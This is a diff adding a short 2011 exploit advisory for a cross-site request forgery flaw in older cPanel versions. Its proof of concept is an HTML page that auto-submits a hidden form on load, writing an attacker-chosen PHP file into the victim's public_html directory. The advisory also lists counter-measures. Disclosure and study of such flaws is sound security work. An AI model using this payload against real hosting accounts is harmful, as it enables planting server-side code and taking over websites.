@@ -1,0 +1,42 @@
+# Exploit Title: cPanel < 11.25 CSRF - Add php script
+# Date: 27.05.2011
+# Author: ninjashell
+# Software Link: http://cpanel.net
+# Version: 11.25 (see details below)
+# Tested on: Linux
+# CVE : N/A
+
+I. Introduction
+cPanel versions below and excluding 11.25 , are vulnerable to CSRF which
+leads to uploading a PHP script of the attackers liking. If you have turned
+off security tokens and referrer security check, no matter what version you
+are using, you are vulnerable as well.
+
+II. Proof of concept (PoC)
+<html>
+<form name="editform" action="
+http://localhost:2082/frontend/x3/err/savefile.html" method=POST
+onSubmit="return loadfdata();">
+<input type="hidden" id="codepage" class="codepress html" name="page"
+value="<?php echo 'ninjashell'; ?>">
+<input type="hidden" name="domain" value="localhost">
+<input type="hidden" value="public_html/" name="dir">
+<input type="hidden" value="ninjashell.php" name="file">
+<body onload="document.forms.editform.submit();">
+</form>
+</html>
+Afterwards simply check for ninjashell.php in the directory.
+
+III. Counter-measures
+All cPanel versions starting from 11.25 and above have two in-built security
+features to prevent such attacks - security tokens and referrer security
+check. This means that if you are a cpanel client, you should update your
+software.
+
+IV. About the author.
+- Ethical hacker;
+- Freelance security consultant/penetration tester;
+- Security researcher in the spare time;
+- Over 12 years of experience;
+You can always email me ninjashellmail@gmail.com or follow me on twitter
+@ninjashell1337
